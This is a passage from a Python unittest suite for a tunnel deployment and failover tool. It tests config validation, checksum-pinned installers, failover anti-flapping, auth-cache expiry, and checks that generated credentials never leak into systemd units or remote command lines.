        bad_port = json.loads(json.dumps(server_cfg))
        bad_port["inbounds"][0]["listen_port"] = 70000
        self.assertFalse(protocols.SingBoxAdapter.validate_config(bad_port))

        # 5. Reject short/missing password in shadowsocks
        plan_ss = protocols.SingBoxAdapter.generate_shadowsocks_2022(
            pair_id=12, ir_ip="198.51.100.10", fr_ip="203.0.113.20", frontend=443, transport_port=8388
        )
        ss_cfg = json.loads(list(plan_ss["foreign_files"].values())[0])
        bad_ss = json.loads(json.dumps(ss_cfg))
        bad_ss["inbounds"][0]["password"] = "too-short"
        self.assertFalse(protocols.SingBoxAdapter.validate_config(bad_ss))

    def test_27_binary_manager_mktemp_and_package_install(self):
        """Senior Auditor Finding 3-3 Acceptance Test: mktemp -d symlink-race protection and verified iperf3 package script."""
        script_sing = binary_manager.generate_secure_install_script("sing-box", "v1.10.1")
        self.assertIn("mktemp -d", script_sing)
        self.assertIn("trap 'rm -rf \"$TMP_DIR\"' EXIT", script_sing)

        script_iperf = binary_manager.generate_secure_install_script("iperf3")
        self.assertIn("mktemp -d", script_iperf)
        self.assertIn("apt-get install -y -qq iperf3", script_iperf)
        self.assertIn("iperf3 -v", script_iperf)

    def test_28_automated_failover_engine(self):
        """Phase 2 Milestone Acceptance Test: Automated Failover health probing, candidate selection, switchover and anti-flapping."""
        mock_ir = mock_ssh.MockSSHClient(host_role="iran")
        mock_fr = mock_ssh.MockSSHClient(host_role="foreign")

        test_pair = {
            "id": 99,
            "name": "failover_test_pair",
            "frontend_port": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22},
            "base_rtt_ms": 42.0,
            "active_tunnel": "GRE"
        }

        # 1. Health checker detects healthy state when units and sockets are active
        mock_ir.state["services"]["best-tunnel-prod-p99-gre"] = "active"
        mock_fr.state["services"]["best-tunnel-prod-p99-gre"] = "active"
        mock_ir.state["listeners"][443] = "tunnel_client"
        mock_ir.state["packet_loss"] = 0.0

        rep = failover.TunnelHealthChecker.check_health(mock_ir, mock_fr, test_pair, "GRE", dry_run=True)
        self.assertEqual(rep.status, "HEALTHY")

        # 2. Health checker detects DOWN state when units fail
        mock_ir.state["services"]["best-tunnel-prod-p99-gre"] = "inactive"
        rep_down = failover.TunnelHealthChecker.check_health(mock_ir, mock_fr, test_pair, "GRE", dry_run=True)
        self.assertEqual(rep_down.status, "DOWN")

        # 3. Candidate Selector selects valid fallback
        candidate = failover.FailoverCandidateSelector.select_best_candidate(99, "GRE")
        self.assertIsNotNone(candidate)
        self.assertNotEqual(candidate, "GRE")

        # 4. Staged switchover execution (a real service gap, not make-before-break)
        mgr = failover.FailoverManager(min_interval_seconds=180, max_failovers_per_window=3)
        res = mgr.execute_failover(test_pair, "GRE", "wstunnel-v10", reason="Test tunnel failure", dry_run=True, ir_runner=mock_ir, fr_runner=mock_fr)
        self.assertTrue(res["success"])
        self.assertEqual(res["new_protocol"], "wstunnel-v10")

        # 5. Anti-flapping circuit breaker blocks immediate re-failover within min_interval
        res_blocked = mgr.execute_failover(test_pair, "wstunnel-v10", "rathole-noise", reason="Rapid secondary failure", dry_run=True, ir_runner=mock_ir, fr_runner=mock_fr)
        self.assertFalse(res_blocked["success"])
        self.assertTrue(res_blocked.get("blocked"))
        self.assertIn("Anti-flapping", res_blocked.get("reason"))

    def test_underlay_switch_and_rollback_bypass(self):
        """2026-10-27: carrier -> overlay keeps the carrier as the underlay; a rollback bypasses the breaker.

        Fresh pair ids per scenario: the class shares one test database,
        so a scenario must not read another scenario's (or test_28's)
        persisted failover events through the breaker window.
        """
        # 1. A rollback bypasses the breaker; a normal switch stays governed.
        mock_ir = mock_ssh.MockSSHClient(host_role="iran")
        mock_fr = mock_ssh.MockSSHClient(host_role="foreign")
        pair_rb = {
            "id": 91,
            "name": "rollback_test_pair",
            "frontend_port": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22},
            "base_rtt_ms": 42.0,
            "active_tunnel": "GRE"
        }
        mock_ir.state["services"]["best-tunnel-prod-p91-gre"] = "active"
        mock_fr.state["services"]["best-tunnel-prod-p91-gre"] = "active"
        mock_ir.state["listeners"][443] = "tunnel_client"
        mock_ir.state["packet_loss"] = 0.0
        mgr = failover.FailoverManager(min_interval_seconds=180, max_failovers_per_window=3)
        res = mgr.execute_failover(pair_rb, "GRE", "wstunnel-v10", reason="Test tunnel failure", dry_run=True, ir_runner=mock_ir, fr_runner=mock_fr)
        self.assertTrue(res["success"])
        res_blocked = mgr.execute_failover(pair_rb, "wstunnel-v10", "rathole-noise", reason="Rapid secondary failure", dry_run=True, ir_runner=mock_ir, fr_runner=mock_fr)
        self.assertFalse(res_blocked["success"])
        self.assertTrue(res_blocked.get("blocked"))
        self.assertIn("Anti-flapping", res_blocked.get("reason"))
        # The same switch, as the rollback of the switch that just
        # failed, is NOT breaker-blocked: the failed switch's own event
        # is what the unqualified check would refuse on.
        res_rb = mgr.execute_failover(pair_rb, "wstunnel-v10", "rathole-noise", reason="manual-rollback", dry_run=True, ir_runner=mock_ir, fr_runner=mock_fr, is_rollback=True)
        self.assertTrue(res_rb["success"])
        self.assertEqual(res_rb["new_protocol"], "rathole-noise")

        # 2. Carrier -> overlay: the carrier is never torn down.
        mock_ir2 = RecordingRunner(host_role="iran")
        mock_fr2 = RecordingRunner(host_role="foreign")
        pair_ov = {
            "id": 92,
            "name": "overlay_test_pair",
            "frontend_port": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22},
            "base_rtt_ms": 42.0,
            "active_tunnel": "GRE"
        }
        mock_ir2.state["services"]["best-tunnel-prod-p92-gre"] = "active"
        mock_fr2.state["services"]["best-tunnel-prod-p92-gre"] = "active"
        mock_ir2.state["listeners"][443] = "tunnel_client"
        mock_ir2.state["packet_loss"] = 0.0
        mgr2 = failover.FailoverManager(min_interval_seconds=180, max_failovers_per_window=3)
        res2 = mgr2.execute_failover(pair_ov, "GRE", "frp-TLS", reason="Test overlay on carrier", dry_run=True, ir_runner=mock_ir2, fr_runner=mock_fr2)
        self.assertTrue(res2["success"])
        self.assertEqual(res2["new_protocol"], "frp-TLS")
        # The carrier unit stayed up, its interface was never deleted,
        # and its unit was never stopped: only the two frontend DNAT
        # deletes moved, which is the whole cutover.
        self.assertEqual(mock_ir2.state["services"].get("best-tunnel-prod-p92-gre"), "active")
        self.assertEqual(mock_ir2.state["services"].get("best-tunnel-prod-p92-frps"), "active")
        self.assertNotIn("ip tunnel del grep92", mock_ir2.issued())
        self.assertNotIn("systemctl stop best-tunnel-prod-p92-gre", mock_ir2.issued())

        # 3. Peel: an overlay back to its live underlay carrier.
        mock_ir3 = mock_ssh.MockSSHClient(host_role="iran")
        mock_fr3 = mock_ssh.MockSSHClient(host_role="foreign")
        tun_ir3, tun_fr3 = protocols.carrier_inner_pair("GRE", 93, "prod")
        pair_peel = {
            "id": 93,
            "name": "peel_test_pair",
            "frontend_port": 443,
            "iran": {"host": "198.51.100.10", "port": 22, "dial_host": tun_ir3},
            "foreign": {"host": "203.0.113.20", "port": 22, "dial_host": tun_fr3},
            "base_rtt_ms": 42.0,
            "active_tunnel": "frp-TLS",
            "underlay_carrier": "gre"
        }
        mock_ir3.state["services"]["best-tunnel-prod-p93-frps"] = "active"
        mock_fr3.state["services"]["best-tunnel-prod-p93-frpc"] = "active"
        mock_ir3.state["services"]["best-tunnel-prod-p93-gre"] = "active"
        mock_fr3.state["services"]["best-tunnel-prod-p93-gre"] = "active"
        mock_ir3.state["packet_loss"] = 0.0
        mock_ir3.state["prerouting"] = [
            f"-A PREROUTING -p tcp ! -i grep93 --dport 443 -m comment --comment best-tunnel-93-prod-GRE -j DNAT --to-destination {tun_fr3}:443",
            f"-A PREROUTING -p udp ! -i grep93 --dport 443 -m comment --comment best-tunnel-93-prod-GRE -j DNAT --to-destination {tun_fr3}:443",
        ]
        mgr3 = failover.FailoverManager(min_interval_seconds=180, max_failovers_per_window=3)
        res3 = mgr3.execute_failover(pair_peel, "frp-TLS", "GRE", reason="Test peel", dry_run=True, ir_runner=mock_ir3, fr_runner=mock_fr3)
        self.assertTrue(res3["success"])
        self.assertEqual(res3["new_protocol"], "GRE")
        self.assertEqual(mock_ir3.state["services"].get("best-tunnel-prod-p93-frps"), "inactive")
        self.assertEqual(mock_ir3.state["services"].get("best-tunnel-prod-p93-gre"), "active")

    def test_29_auth_cache_ttl_and_bearer_auth(self):
        """Auditor report041 §2.1 Acceptance Test: 15-minute AUTH_CACHE TTL eviction, manual flush, and Bearer auth."""
        # 1. Test TTL eviction
        with dashboard.AUTH_CACHE_LOCK:
            dashboard.AUTH_CACHE[101] = {
                "iran": {"auth": {"value": "test_pw"}},
                "foreign": {"auth": {"value": "test_pw"}},
                "expires_at": time.time() - 10 # expired 10s ago
            }
            dashboard.AUTH_CACHE[102] = {
                "iran": {"auth": {"value": "test_pw"}},
                "foreign": {"auth": {"value": "test_pw"}},
                "expires_at": time.time() + 900 # valid for 15min
            }

        dashboard.cleanup_auth_cache()
        with dashboard.AUTH_CACHE_LOCK:
            self.assertNotIn(101, dashboard.AUTH_CACHE)
            self.assertIn(102, dashboard.AUTH_CACHE)

        # 2. Test manual emergency flush
        dashboard.purge_all_cached_auth()
        with dashboard.AUTH_CACHE_LOCK:
            self.assertEqual(len(dashboard.AUTH_CACHE), 0)

        # 3. Test Bearer auth token validation
        headers_empty = {}
        headers_valid = {"Authorization": "Bearer my_secret_token_123"}
        headers_bad = {"Authorization": "Bearer wrong_token"}

        # When no token configured: open for localhost
        dashboard.BEST_TUNNEL_API_TOKEN = ""
        self.assertTrue(dashboard.check_bearer_auth(headers_empty))

        # When token configured: enforces Bearer check
        dashboard.BEST_TUNNEL_API_TOKEN = "my_secret_token_123"
        try:
            self.assertFalse(dashboard.check_bearer_auth(headers_empty))
            self.assertFalse(dashboard.check_bearer_auth(headers_bad))
            self.assertTrue(dashboard.check_bearer_auth(headers_valid))
        finally:
            dashboard.BEST_TUNNEL_API_TOKEN = ""

    def test_30_auth_cache_persistence_across_requests_and_host_locks(self):
        """P0-3 & P0-7 Acceptance Test: Prove AUTH_CACHE credentials persist across consecutive requests with TTL, and host locks prevent concurrency."""
        # 1. Test that set_auth_cache populates expires_at correctly
        ir_spec = {"host": "198.51.100.10", "port": 22, "auth": {"type": "password", "value": "secret_ir"}}
        fr_spec = {"host": "203.0.113.20", "port": 22, "auth": {"type": "password", "value": "secret_fr"}}
        dashboard.set_auth_cache(200, ir_spec, fr_spec)

        with dashboard.AUTH_CACHE_LOCK:
            self.assertIn(200, dashboard.AUTH_CACHE)
            cached = dashboard.AUTH_CACHE[200]
            self.assertGreater(cached.get("expires_at", 0), time.time())
            self.assertEqual(cached["iran"]["auth"]["value"], "secret_ir")

        # 2. Assert credentials persist between consecutive requests (cleanup does NOT purge valid entries)
        dashboard.cleanup_auth_cache()
        with dashboard.AUTH_CACHE_LOCK:
            self.assertIn(200, dashboard.AUTH_CACHE, "Credentials must NOT be purged on consecutive requests before TTL!")

        # 3. Assert credentials expire after simulated TTL expiry
        with dashboard.AUTH_CACHE_LOCK:
            dashboard.AUTH_CACHE[200]["expires_at"] = time.time() - 1.0
        dashboard.cleanup_auth_cache()
        with dashboard.AUTH_CACHE_LOCK:
            self.assertNotIn(200, dashboard.AUTH_CACHE, "Expired credentials must be cleanly purged after TTL!")

        # 4. Host-level concurrency guard (P0-7)
        hosts = ["198.51.100.50", "203.0.113.60"]
        self.assertTrue(dashboard.try_acquire_host_locks(hosts))
        # Second acquire for same host must be rejected
        self.assertFalse(dashboard.try_acquire_host_locks(["198.51.100.50", "203.0.113.99"]))
        # Release locks
        dashboard.release_host_locks(hosts)
        # Now acquire succeeds
        self.assertTrue(dashboard.try_acquire_host_locks(["198.51.100.50"]))
        dashboard.release_host_locks(["198.51.100.50"])

    def test_31_p0_scoring_wtp_and_probe_integrity(self):
        """P0-4 & P0-6 Acceptance Test: Restore throughput weight in scoring, 25% DQ threshold, and probe integrity."""
        # 1. Verify w_tp > 0.0 across all profiles
        self.assertEqual(scoring.PROFILES["balanced"]["w_tp"], 0.20)
        self.assertEqual(scoring.PROFILES["gaming"]["w_tp"], 0.05)
        self.assertEqual(scoring.PROFILES["ultraspeed"]["w_tp"], 0.40)

        # 2. Verify throughput directly influences Ultra-Speed score
        m_low_tp = scoring.evaluate_tunnel_metrics(45.0, 2.0, 4, 30.0, 0.0, profile="ultraspeed", throughput_mbps=10.0, base_rtt=40.0)
        m_high_tp = scoring.evaluate_tunnel_metrics(45.0, 2.0, 4, 30.0, 0.0, profile="ultraspeed", throughput_mbps=95.0, base_rtt=40.0)
        self.assertGreater(m_high_tp["score"], m_low_tp["score"], "Higher iperf3 throughput must yield higher Ultra-Speed score!")

        # 3. Verify harmonized DQ threshold: 22% loss is penalized but NOT DQ; 26% loss IS DQ
        m_penalized = scoring.evaluate_tunnel_metrics(45.0, 2.0, 4, 30.0, 22.0, profile="balanced", throughput_mbps=50.0, base_rtt=40.0)
        self.assertFalse(m_penalized["disqualified"], "22% loss should not be disqualified (threshold is 25%)")
        self.assertGreater(m_penalized["score"], 0.0)

        m_dq = scoring.evaluate_tunnel_metrics(45.0, 2.0, 4, 30.0, 26.0, profile="balanced", throughput_mbps=50.0, base_rtt=40.0)
        self.assertTrue(m_dq["disqualified"], ">25% loss must be disqualified!")
        self.assertEqual(m_dq["score"], 0.0)

        # 4. Verify base RTT failure contract does not fabricate fake 42.0 on failure
        class FailingRunner:
            def run(self, cmd, **kwargs):
                return (1, "ping: connect: Network is unreachable", "")

        res_fail = engine.measure_direct_base_rtt(FailingRunner(), "203.0.113.20", dry_run=False)
        self.assertTrue(res_fail.is_fallback)
        self.assertEqual(res_fail.base_rtt_ms, 0.0)

    # ---------------------------------------------------------------------
    # Supervisor Gate-A / Gate-B acceptance tests
    # ---------------------------------------------------------------------

    # Quoted string literals long enough to be a credential rather than a keyword.
    _QUOTED_SECRET = re.compile(r"""["']([^"'\n]{16,})["']""")
    _ENV_LINE = re.compile(r'^([A-Za-z_][A-Za-z0-9_]*)=(.+)$', re.M)
    # An unquoted hex blob of 32+ characters is key material, not a keyword. This exists because of the
    # ESP carrier: `ip xfrm state add ... aead <algo> 0x<40 hex> <icv bits>` writes its SA key unquoted -
    # `ip -batch` does its own whitespace splitting, so quoting the algorithm name is a parse hazard -
    # and the _QUOTED_SECRET and _ENV_LINE patterns above would both walk straight past it.
    _HEX_SECRET = re.compile(r"0x([0-9a-fA-F]{32,})")

    # YAML credential lines (hysteria2): `password: <bare value>` and
    # `pinSHA256: <colon hex>` carry no quotes and no 0x prefix, so the
    # patterns above walk straight past them - the census measured
    # nothing for the protocol until this line existed. Key-gated on
    # purpose: collecting every YAML value would sweep in dial addresses
    # and ports, which legitimately appear in issued commands.
    _YAML_SECRET = re.compile(r'^\s*(?:password|pinSHA256|token|secret)\s*:\s*(\S{8,})\s*$', re.M)

    def _secrets_in(self, files: dict) -> set:
        """Collects every credential-looking literal from a host's non-unit files."""
        secrets = set()
        for path, content in files.items():
            if path.endswith(".service") or path.endswith(".pem"):
                continue
            for val in self._QUOTED_SECRET.findall(content):
                if val.startswith("/") or val.startswith("-----"):
                    continue
                secrets.add(val)
            for val in self._HEX_SECRET.findall(content):
                secrets.add("0x" + val)
            for val in self._YAML_SECRET.findall(content):
                secrets.add(val)
            if not path.endswith((".json", ".toml", ".conf")):
                for _key, val in self._ENV_LINE.findall(content):
                    val = val.strip()
                    if len(val) >= 8:
                        secrets.add(val)
        return secrets

    def test_32_no_secret_reaches_systemd_argv_for_any_protocol(self):
        """Gate-B B1 Acceptance Test: systemd expands ${VAR} in ExecStart= into the command line,
        which is world-readable through /proc/*/cmdline. No generated unit may therefore interpolate
        a credential, and no unit may reference a variable at all."""
        pair_id = 71
        for proto in protocols.ALL_PROTOCOLS:
            plan = protocols.generate_deployment(proto, pair_id, "198.51.100.10", "203.0.113.20", 443)
            for host_key in ("iran_files", "foreign_files"):
                files = plan.get(host_key, {})
                units = {p: c for p, c in files.items() if p.endswith(".service")}
                self.assertTrue(units, f"{proto}/{host_key}: expected at least one systemd unit")
                unit_blob = "\n".join(units.values())

                # 1. No variable expansion anywhere in an ExecStart line.
                for path, content in units.items():
                    for line in content.splitlines():
                        if line.startswith("ExecStart"):
                            self.assertNotIn("$", line, f"{proto} {path}: ExecStart interpolates a variable")

                # 2. No credential literal from any config or env file on the same host.
                for secret in self._secrets_in(files):
                    self.assertNotIn(secret, unit_blob,
                                     f"{proto}/{host_key}: a credential of length {len(secret)} staged "
                                     f"on this host appears in a unit file (the value is deliberately "
                                     f"not printed - a failing test must not become a leak)")

                # 3. No private key material.
                self.assertNotIn("PRIVATE KEY", unit_blob, f"{proto}/{host_key}: private key embedded in a unit")

                # 4. Every EnvironmentFile the units reference must actually be staged on that host.
                for path, content in units.items():
                    for env_path in re.findall(r'^EnvironmentFile=(\S+)$', content, re.M):
                        self.assertIn(env_path, files,
                                      f"{proto}/{host_key}: {path} references {env_path} which is never written")

        # 5. The same question asked of a *deploy* rather than of a plan: everything the orchestrator
        #    issues to a host over SSH is a command line, and a command line is argv. Staging used to be
        #    a `cat > path <<'EOF'` heredoc, which put the whole file - REALITY's private key, chisel's
        #    TLS key, wstunnel's CA key, an ESP SA key - in the argv of a remote `sh -c`, readable in
        #    /proc/<pid>/cmdline for the life of the command. The writer now sends the payload over the
        #    channel's stdin, so a secret must appear in the files and in the files only.
        for proto in protocols.ALL_PROTOCOLS:
            ir_rec, fr_rec = RecordingRunner(host_role="iran"), RecordingRunner(host_role="foreign")
            res = engine.deploy_tunnel(pair={"id": 91, "name": "argv_census", "frontend": 443,
                                             "iran": {"host": "198.51.100.10", "port": 22},
                                             "foreign": {"host": "203.0.113.20", "port": 22}},
                                       choice=proto, dry_run=False, force_confirmed=True,
                                       ir_runner=ir_rec, fr_runner=fr_rec)
            self.assertTrue(res["ok"], f"{proto}: fixture deploy failed: {res}")
            collected = self._secrets_in(ir_rec.state["files"]) | self._secrets_in(fr_rec.state["files"])
            # GRE is the one generator with no credential to leak: it has no daemon and no key, which is
            # precisely the property the ESP carrier exists to replace. Every other protocol has to give
            # the census something to check, or this step passes by measuring nothing.
            if proto != "GRE":
                self.assertTrue(collected,
                                f"{proto}: the argv census collected no credential, so it asserted nothing")
            issued = ir_rec.issued() + "\n" + fr_rec.issued()
            for secret in collected:
                self.assertNotIn(secret, issued,
                                 f"{proto}: a staged credential of length {len(secret)} also appears in "
                                 f"a remote command line (value not printed: a failing test must not "
                                 f"become a leak)")

    def test_33_supply_chain_pinning_integrity(self):
        """Gate-B B2 Acceptance Test: the checksum table is structurally valid, every hash and release
        URL literal in the root installers is pinned, and unpinned inputs fail closed."""
        buf = io.StringIO()
        orig_stdout = sys.stdout
        try:
            sys.stdout = buf
            table_problems = verify_checksums.audit_table()
            script_problems = verify_checksums.audit_shell_scripts()
        finally:
            sys.stdout = orig_stdout
        self.assertEqual(table_problems, [], f"OFFICIAL_CHECKSUMS structural problems: {table_problems}")
        self.assertEqual(script_problems, [], f"Root installer problems: {script_problems}")

        # Every pinned entry: 64 lowercase hex, https GitHub release, install target under /usr/local/bin
        for binary, versions in binary_manager.OFFICIAL_CHECKSUMS.items():
            for version, arches in versions.items():
                for arch, entry in arches.items():
                    self.assertRegex(entry["sha256"], r'^[0-9a-f]{64}$', f"{binary} {version} {arch}")
                    self.assertTrue(entry["url"].startswith("https://github.com/"), f"{binary} {version} url")
                    for dest in entry["binaries"].values():
                        self.assertTrue(dest.startswith("/usr/local/bin/"), f"{binary} {version} -> {dest}")

        # frp ships two executables; a bare "frp" target would never be found in the archive
        frp_bins = binary_manager.OFFICIAL_CHECKSUMS["frp"]["v0.71.0"]["amd64"]["binaries"]
        self.assertEqual(set(frp_bins), {"frpc", "frps"})
        self.assertNotIn("frp", frp_bins)

        # iperf3 and kcptun have no trustworthy standalone asset: they go through the signed distro repo
        for pkg in ("iperf3", "kcptun"):
            self.assertIn(pkg, binary_manager.APT_PACKAGES)
            self.assertNotIn(pkg, binary_manager.OFFICIAL_CHECKSUMS)
        self.assertIn("/usr/local/bin/kcptun-server", binary_manager.APT_PACKAGES["kcptun"]["links"])

        # Fail closed: never substitute a best-effort download for an unpinned input
        with self.assertRaises(ValueError):
            binary_manager.generate_secure_install_script("sing-box", "v9.9.9")
        with self.assertRaises(ValueError):
            binary_manager.generate_secure_install_script("sing-box", arch="arm64")
        with self.assertRaises(ValueError):
            binary_manager.generate_secure_install_script("definitely-not-a-binary")
        self.assertEqual(binary_manager.get_pinned_checksum("sing-box", "v9.9.9"), "")

        # The hash must be checked before anything is moved into place
        script = binary_manager.generate_secure_install_script("frp", "v0.71.0")
        self.assertLess(script.index("sha256sum"), script.index('install_bin "frpc"'))
        self.assertLess(script.index("exit 1"), script.index('install_bin "frpc"'))

        # The provenance table attests specific release assets; it must not drift from the pins.
        self.assertEqual(set(verify_checksums.UPSTREAM_INTEGRITY_FILES),
                         {"wstunnel", "chisel", "frp", "backhaul", "gost"})
        for binary, (repo, tag, _fname, asset) in verify_checksums.UPSTREAM_INTEGRITY_FILES.items():
            entry = binary_manager.OFFICIAL_CHECKSUMS[binary][tag]["amd64"]
            self.assertEqual(entry["url"], f"https://github.com/{repo}/releases/download/{tag}/{asset}",
                             f"{binary}: provenance entry no longer matches the pinned release URL")

    def test_34_stability_metric_semantics_and_fail_safe(self):
        """Gate-A A3 Acceptance Test: `seconds_survived` is a real measurement over a fixed window,
        packet loss is penalised exactly once, and an unparseable probe result disqualifies the run
        instead of being read as a healthy tunnel."""
        # 1. Scoring level: full survival credit must not depend on loss.
        m = scoring.evaluate_tunnel_metrics(45.0, 2.0, 4, 30.0, 10.0, profile="balanced",
                                           throughput_mbps=50.0, base_rtt=40.0)
        self.assertEqual(m["breakdown"]["s_stab"], 1.0)
        self.assertLess(m["breakdown"]["loss_penalty"], 1.0)
        self.assertFalse(m["disqualified"])

        # 2. Survival credit is clamped to the window, so a long benchmark cannot inflate it.
        self.assertEqual(scoring.compute_stab_score(probe.STABILITY_WINDOW), 1.0)
        self.assertEqual(scoring.compute_stab_score(probe.STABILITY_WINDOW * 3), 1.0)
        self.assertEqual(scoring.compute_stab_score(12.0), 0.4)

        mock_pair = {
            "id": 97, "name": "stability_semantics", "frontend": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22}
        }

        # 3. A healthy mock survives exactly the observation window - not the benchmark wall-clock.
        mock_ir = mock_ssh.MockSSHClient(host_role="iran")
        mock_fr = mock_ssh.MockSSHClient(host_role="foreign")
        res_ok = engine.run_single_benchmark(mock_pair, "GRE", dry_run=False, ir_runner=mock_ir, fr_runner=mock_fr)
        self.assertEqual(res_ok["breakdown"]["seconds_survived"], probe.STABILITY_WINDOW)
        self.assertFalse(res_ok["disqualified"])

        # 4. A tunnel that drops out mid-window is disqualified on the survival gate alone.
        mock_ir_short = mock_ssh.MockSSHClient(host_role="iran")
        mock_fr_short = mock_ssh.MockSSHClient(host_role="foreign")
        mock_ir_short.state["stability_survived"] = 12.0
        res_short = engine.run_single_benchmark(mock_pair, "GRE", dry_run=False,
                                                ir_runner=mock_ir_short, fr_runner=mock_fr_short)
        self.assertEqual(res_short["breakdown"]["seconds_survived"], 12.0)
        self.assertTrue(res_short["disqualified"])
        self.assertTrue(any("Connection dropped under 25s" in r for r in res_short["dq_reasons"]))

        # 5. A probe that emits a traceback instead of metrics must fail closed.
        class GarbageProbeRunner(mock_ssh.MockSSHClient):
            def run(self, cmd, check=True, best_effort=False, timeout=30, retryable=False):
                if "best_probe.py stability" in cmd:
                    return (1, "Traceback (most recent call last):\n  ImportError: no module named x\n", "")
                return super().run(cmd, check=check, best_effort=best_effort, timeout=timeout)

        res_garbage = engine.run_single_benchmark(mock_pair, "GRE", dry_run=False,
                                                  ir_runner=GarbageProbeRunner(host_role="iran"),
                                                  fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertTrue(res_garbage["disqualified"])
        self.assertEqual(res_garbage["score"], 0.0)
        self.assertTrue(any(r.startswith("MEASUREMENT_FAILED") for r in res_garbage["dq_reasons"]))

    def test_35_probe_persistence_and_failover_fail_safe(self):
        """Gate-A A4 Acceptance Test: the measurement agent lives outside /tmp so it survives benchmark
        teardown, a missing agent is reported as an outage rather than as health, and the failover
        endpoints are reachable and host-locked."""
        # 1. Persistent location: benchmark pre-clean wipes /tmp/best* and /tmp/test*.
        self.assertFalse(probe.PROBE_PATH.startswith("/tmp"))

        # 2. The HTTP layer and the SSH factory must read BEST_TUNNEL_DRY_RUN with the same
        #    default. They used to disagree ("0" vs "1"), so an unset variable put the dashboard
        #    in live mode while get_ssh_runner stayed mocked.
        self.assertEqual(dashboard.is_dry_run(), mock_ssh.is_dry_run_enabled())
        self.assertTrue(dashboard.is_dry_run(), "This suite must never drive a live SSH session")

        mock_pair = {
            "id": 96, "name": "probe_persistence", "frontend": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22}
        }
        mock_ir = mock_ssh.MockSSHClient(host_role="iran")
        mock_fr = mock_ssh.MockSSHClient(host_role="foreign")
        engine.run_single_benchmark(mock_pair, "GRE", dry_run=False, ir_runner=mock_ir, fr_runner=mock_fr)
        self.assertIn(probe.PROBE_PATH, mock_ir.state["files"])
        # The benchmark closes its runners on teardown; a later health check reconnects.
        mock_ir.connected = True
        self.assertTrue(probe.ensure_probe(mock_ir))

        # 3. Fail-safe: an uninstallable agent must read as DOWN, never as HEALTHY. Judged on a
        #    user-space transport, because a carrier needs no agent on the host at all (see 3b).
        class UnwritableRunner(mock_ssh.MockSSHClient):
            def run(self, cmd, check=True, best_effort=False, timeout=30, retryable=False):
                if "best_probe.py" in cmd:
                    return (1, "", "Read-only file system")
                return super().run(cmd, check=check, best_effort=best_effort, timeout=timeout)

        broken_ir = UnwritableRunner(host_role="iran")
        self.assertFalse(probe.ensure_probe(broken_ir))
        health_pair = {"id": 96, "frontend_port": 443, "base_rtt_ms": 42.0,
                       "iran": {"host": "198.51.100.10"}, "foreign": {"host": "203.0.113.20"}}
        rep = failover.TunnelHealthChecker.check_health(
            broken_ir, mock_ssh.MockSSHClient(host_role="foreign"), health_pair,
            "chisel-wss", dry_run=True)
        self.assertEqual(rep.status, "DOWN")
        self.assertIn("Measurement agent unavailable", rep.details)

        # 3b. A carrier is judged by kernel ICMP through its interface, so a missing agent must not be
        # what decides it - and the instrument that replaced it has to fail the same way. Units active,
        # inner path silent: the only thing left to say is DOWN. A carrier that reads HEALTHY while
        # nothing crosses it would be healed *away* by the monitor, which is how an envelope every
        # transport on the pair rides on gets torn down by a "repair".
        class SilentPingRunner(mock_ssh.MockSSHClient):
            def run(self, cmd, check=True, best_effort=False, timeout=30, retryable=False):
                if cmd.startswith("ping "):
                    return (1, "connect: Network is unreachable", "")
                return super().run(cmd, check=check, best_effort=best_effort, timeout=timeout)

        esp_svc = "best-tunnel-prod-p96-esp"
        silent_ir = SilentPingRunner(host_role="iran")
        silent_ir.state["services"][esp_svc] = "active"
        silent_fr = mock_ssh.MockSSHClient(host_role="foreign")
        silent_fr.state["services"][esp_svc] = "active"
        rep_esp = failover.TunnelHealthChecker.check_health(
            silent_ir, silent_fr, health_pair, "ESP", dry_run=True)
        self.assertEqual(rep_esp.status, "DOWN",
                         "a carrier whose inner address answers nothing is an outage, not a health pass")
        self.assertIn("loss=100.0%", rep_esp.details)
        self.assertIn("n/a", rep_esp.details,
                      "a carrier owns no frontend listener, so that check must be reported as not "
                      "applicable rather than counted as a failure it happens to share with an outage")
        self.assertNotIn("Measurement agent unavailable", rep_esp.details,
                         "ESP needs no agent on the host; its verdict must not rest on one")

        # 4. /api/failover/check used to raise NameError into a broad except and always report an error.
        pair_id = storage.add_pair(name=f"failover_api_{int(time.time() * 1000)}",
                                   iran_host="198.51.100.10", foreign_host="203.0.113.20",
                                   frontend_port=443)
        self.addCleanup(storage.delete_pair, pair_id)
        # Before anything is recorded the endpoint must refuse: it used to guess GRE and judge a pair
        # whose real tunnel was something else entirely.
        resp = self._post_api("/api/failover/check", {"id": pair_id})
        self.assertFalse(resp["body"].get("ok"),
                         f"an unknown active tunnel must not be guessed: {resp['body']}")
        self.assertIn("no recorded active_tunnel", resp["body"].get("error", ""))

        storage.update_pair_status(pair_id, status="ACTIVE", active_tunnel="GRE")
        resp = self._post_api("/api/failover/check", {"id": pair_id})
        self.assertTrue(resp["body"].get("ok"), f"/api/failover/check failed: {resp['body']}")
        self.assertIn(resp["body"]["status"], {"HEALTHY", "DEGRADED", "DOWN"})

        # 5. /api/failover/trigger used to omit the required target_protocol argument (TypeError).
        resp = self._post_api("/api/failover/trigger",
                              {"id": pair_id, "target": "wstunnel-v10", "reason": "acceptance test"})
        self.assertEqual(resp["code"], 200, f"trigger failed: {resp['body']}")
        self.assertTrue(resp["body"].get("success"))
        self.assertEqual(resp["body"].get("new_protocol"), "wstunnel-v10")

        # 6. The endpoint must have released the host locks it took.
        hosts = ["198.51.100.10", "203.0.113.20"]
        self.assertTrue(dashboard.try_acquire_host_locks(hosts))
        dashboard.release_host_locks(hosts)

        # 7. A concurrent operation on the same hosts is rejected, and the lock is still released.
        self.assertTrue(dashboard.try_acquire_host_locks(hosts))
        try:
            resp = self._post_api("/api/failover/trigger", {"id": pair_id, "target": "GRE"})
            self.assertEqual(resp["code"], 400)
            self.assertIn("Concurrency rejected", resp["body"].get("error", ""))
        finally:
            dashboard.release_host_locks(hosts)

    def _post_api(self, path: str, payload: dict) -> dict:
        """Drives dashboard.H.do_POST the way test_16/test_17 do, returning (code, parsed body)."""
